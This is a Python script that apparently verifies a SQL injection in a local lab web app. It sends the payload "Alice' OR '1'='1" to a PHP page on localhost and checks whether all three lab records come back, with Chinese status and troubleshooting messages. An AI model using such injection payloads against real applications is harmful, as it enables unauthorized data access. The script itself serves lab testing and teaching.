import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S001/index.php"

def fetch(name):
    query = urllib.parse.urlencode({"name": name})
    url = f"{BASE}?{query}"
    with urllib.request.urlopen(url, timeout=5) as resp:
        body = resp.read().decode("utf-8", "replace")
        return resp.status, body

def marker(person_id, name):
    return f"ID {person_id}：{name}"

def main():
    ordinary_status, ordinary_body = fetch("Alice")
    payload = "Alice' OR '1'='1"
    test_status, test_body = fetch(payload)

    ordinary_alice = marker(1, "Alice") in ordinary_body
    ordinary_bob = marker(2, "Bob") in ordinary_body
    ordinary_carol = marker(3, "Carol") in ordinary_body

    test_alice = marker(1, "Alice") in test_body
    test_bob = marker(2, "Bob") in test_body
    test_carol = marker(3, "Carol") in test_body

    print(f"普通输入 status={ordinary_status}")
    print(f"普通输入 Alice={ordinary_alice}, Bob={ordinary_bob}, Carol={ordinary_carol}")
    print(f"测试输入 status={test_status}")
    print(f"测试输入 Alice={test_alice}, Bob={test_bob}, Carol={test_carol}")

    ordinary_ok = ordinary_alice and not ordinary_bob and not ordinary_carol
    test_changed = test_alice and test_bob and test_carol

    if ordinary_ok and test_changed:
        print("观察结果：普通输入仅显示 Alice；测试输入显示 Alice、Bob、Carol，符合拼接注入导致的查询条件变化。")
        return 0

    print("未达到预期观察结果。请检查：")
    print("1. http://127.0.0.1:4280/lab_cases/S001/index.php 是否可访问；")
    print("2. lab_people 是否预置 1 Alice、2 Bob、3 Carol；")
    print("3. common/db_connect.php 的 $db 是否连接正常；")
    print("4. PHP 错误日志中是否有 S001 query failed 记录。")
    return 1

if __name__ == "__main__":
    sys.exit(main())
